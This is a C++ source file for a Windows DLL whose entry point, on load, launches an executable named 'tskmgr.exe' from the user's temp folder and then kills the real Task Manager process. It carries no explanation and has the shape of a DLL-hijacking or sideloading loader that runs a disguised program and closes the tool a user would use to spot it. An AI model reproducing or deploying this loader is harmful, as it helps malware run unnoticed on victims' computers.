#include <iostream>
#include <Windows.h>

#define DLL_EXPORT

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		STARTUPINFOA si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));

		LPTSTR value;
		value = (LPTSTR)malloc(255 * sizeof(TCHAR));
		GetEnvironmentVariable(TEXT("temp"), value, 255);
		std::wstring ws(value);
		std::string path(ws.begin(), ws.end());
		path += "\\tskmgr.exe d";
		
		LPSTR s = const_cast<char*>(path.c_str());

		CreateProcessA(NULL, s, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		system("taskkill /IM Taskmgr.exe");

	}
	return TRUE;
}